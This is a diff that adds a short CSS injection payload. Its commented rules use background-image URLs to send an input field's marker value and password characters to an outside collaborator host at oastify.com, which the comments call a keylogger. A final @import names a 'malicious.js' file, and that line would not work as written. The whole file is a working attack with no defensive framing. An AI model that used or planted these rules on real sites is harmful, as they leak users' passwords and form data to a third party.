@@ -1,0 +1,12 @@
+/* Exfiltrate data via background-image */
+input[name="secret"] {
+  background-image: url("https://ylngqyy7mee6bth9lt1pxi9vym4dsig7.oastify.com?data=CSS_INJECTION_SUCCESS");
+}
+
+/* Keylogger via attribute selectors */
+input[type="password"][value^="a"] { background-image: url("https://ylngqyy7mee6bth9lt1pxi9vym4dsig7.oastify.com/log?char=a"); }
+input[type="password"][value^="b"] { background-image: url("https://ylngqyy7mee6bth9lt1pxi9vym4dsig7.oastify.com/log?char=b"); }
+/* ... continue for all chars ... */
+
+/* Prepare for JS injection */
+@import url('https://ylngqyy7mee6bth9lt1pxi9vym4dsig7.oastify.com/malicious.js');
